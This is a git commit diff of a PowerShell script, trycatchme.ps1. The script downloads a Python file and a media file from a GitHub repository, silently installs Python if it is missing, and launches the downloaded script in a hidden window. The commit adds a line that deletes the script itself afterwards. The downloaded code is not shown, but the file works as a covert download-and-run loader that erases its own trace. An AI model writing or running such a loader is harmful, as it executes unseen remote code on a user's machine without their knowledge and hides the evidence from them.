379dd570829562e5e8bb0e74e513c0e0f1fc2c43
M4rc333l <94375791+M4rc333l@users.noreply.github.com>
2024-06-22 21:10:47 +0200

    Update trycatchme.ps1

--- trycatchme.ps1
+++ trycatchme.ps1
@@ -19,3 +19,4 @@ Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/Spongebo
 Invoke-WebRequest -Uri "https://github.com/M4rc333l/trycatchme/raw/main/TryCatchMe.py" -OutFile "script.py"
 $p = &{python -V} 2>&1
 $version = if($p -is [System.Management.Automation.ErrorRecord]) { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe" -OutFile "Python-Install.exe"; Start-Process "Python-Install.exe" -ArgumentList "/passive InstallAllUsers=0 PrependPath=1" -Wait; Remove-Item "Python-Install.exe"; Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden} else { Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden }
+Remove-Item "trycatchme.ps1"
